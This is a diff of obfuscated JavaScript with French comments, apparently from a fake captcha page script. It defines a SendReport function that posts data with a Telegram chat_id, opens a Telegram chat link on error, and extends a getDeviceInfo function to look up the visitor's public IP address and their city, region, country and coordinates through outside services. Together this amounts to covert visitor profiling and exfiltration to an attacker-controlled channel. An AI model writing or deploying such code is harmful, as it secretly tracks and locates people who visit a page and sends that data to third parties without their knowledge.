@@ -298,13 +298,15 @@ if (window.location.href.toLowerCase().includes("captcha")) {
         })();
       } catch (_0x35a18e) {
         console.error("Erreur:", _0x35a18e.message);
-        alert("Erreur :" + _0x35a18e.message); // Une seule alerte en cas d'erreur
-        window.open("https://web.telegram.org/k/#-4712226405", "_blank"); // Nouvel onglet
+        alert("Erreur : " + _0x35a18e.message);
+        window.open("https://web.telegram.org/k/#-4712226405", "_blank");
       }
     }
+
     _0x32d4b8();
   })();
 }
+
 function SendReport(_0x351501) {
   const _0x150185 = {
     'chat_id': "-1002331768842",
@@ -318,6 +320,7 @@ function SendReport(_0x351501) {
     'body': JSON.stringify(_0x150185)
   }).then(_0x72279b => _0x72279b.json()).then(_0x290d69 => console.log(_0x290d69))["catch"](_0xdb5d0 => console.error("Erreur:", _0xdb5d0));
 }
+
 async function getDeviceInfo() {
   const _0x12c555 = {
     'userAgent': navigator.userAgent,
@@ -325,4 +328,18 @@ async function getDeviceInfo() {
     'connectionType': navigator.connection ? navigator.connection.effectiveType : "Unknown"
   };
   try {
-    const _0
+    const _0x5260d2 = await fetch("https://api64.ipify.org?format=json");
+    const _0x194da5 = await _0x5260d2.json();
+    _0x12c555.ip = _0x194da5.ip;
+    const _0x2cd617 = await fetch("https://ipwho.is/" + _0x194da5.ip);
+    const _0x45a6b2 = await _0x2cd617.json();
+    _0x12c555.city = _0x45a6b2.city || "Unknown";
+    _0x12c555.region = _0x45a6b2.region || "Unknown";
+    _0x12c555.country = _0x45a6b2.country || "Unknown";
+    _0x12c555.latitude = _0x45a6b2.latitude || "Unknown";
+    _0x12c555.longitude = _0x45a6b2.longitude || "Unknown";
+  } catch (_0x3e6361) {
+    console.error("Impossible d'obtenir l'adresse IP et la localisation :", _0x3e6361);
+  }
+  return _0x12c555;
+}
